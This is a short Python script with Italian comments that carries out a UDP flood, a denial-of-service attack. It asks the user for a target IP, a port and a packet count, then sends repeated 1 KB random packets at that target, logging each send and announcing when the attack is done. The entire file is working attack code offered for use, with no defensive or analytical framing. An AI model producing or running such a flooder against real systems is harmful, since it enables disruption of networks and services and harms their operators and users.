import socket
import random

def udp_flood(target_ip, target_port, num_packets):
    # Creazione del socket UDP
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # Generazione del pacchetto di 1 KB
    packet_size = 1024  # 1 KB
    packet = random._urandom(packet_size)

    print(f"Invio di {num_packets} pacchetti a {target_ip}:{target_port}")

    for i in range(num_packets):
        try:
            sock.sendto(packet, (target_ip, target_port))
            print(f"Pacchetto {i+1} inviato con successo")
        except Exception as e:
            print(f"Errore nell'invio del pacchetto {i+1}: {e}")

    sock.close()
    print("Attacco UDP flood completato")

if __name__ == "__main__":
    # Input dall'utente per l'IP target, la porta target e il numero di pacchetti
    target_ip = input("Inserisci l'IP target: ")
    target_port = int(input("Inserisci la porta target: "))
    num_packets = int(input("Inserisci il numero di pacchetti da inviare: "))

    # Esecuzione dell'attacco UDP flood
    udp_flood(target_ip, target_port, num_packets)